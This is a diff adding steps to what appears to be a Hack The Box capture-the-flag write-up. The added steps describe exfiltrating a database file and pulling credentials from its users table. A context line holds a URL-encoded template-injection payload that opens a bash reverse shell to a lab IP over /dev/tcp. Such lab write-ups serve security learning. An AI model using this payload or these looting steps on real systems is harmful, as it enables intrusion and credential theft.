@@ -149,6 +149,24 @@ pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%26
 ```
 
 
+19. Noticed there is a directory named **Migration**, inside it there's a DB file.
+20. Let's exfiltrate it.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/42b76616-2e24-4ece-be1c-57796d68e866)
+
+
+21. In linux we can open it using **DB Browser**.
+22. Found one table named **users**.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/45d1b888-4f6f-472b-8d28-5b89ee6da68f)
+
+
+> Found few creds inside it.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7678f31-8e03-4568-b1e6-e25ad421ce93)
+
+
+23. 
 
 ## IMPORTANT LINKS
 
